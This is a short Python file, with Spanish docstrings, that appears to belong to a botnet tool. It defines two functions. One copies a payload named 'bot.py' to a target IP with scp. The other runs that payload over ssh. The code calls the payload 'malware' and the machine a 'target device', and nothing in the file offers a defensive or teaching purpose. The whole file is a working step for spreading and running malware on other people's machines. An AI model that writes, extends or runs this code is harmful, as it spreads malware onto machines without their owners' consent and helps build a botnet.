import subprocess

def execute_malware_on_target(target_ip):
    """Ejecuta el malware en un dispositivo objetivo."""
    print(f"Ejecutando malware en {target_ip}")
    command = f"ssh user@{target_ip} 'python3 /tmp/bot.py'"
    subprocess.run(command, shell=True)

def copy_malware_to_target(target_ip):
    """Copia el malware al dispositivo objetivo usando SCP."""
    print(f"Copiando malware a {target_ip}")
    command = f"scp bot.py user@{target_ip}:/tmp/"
    subprocess.run(command, shell=True)

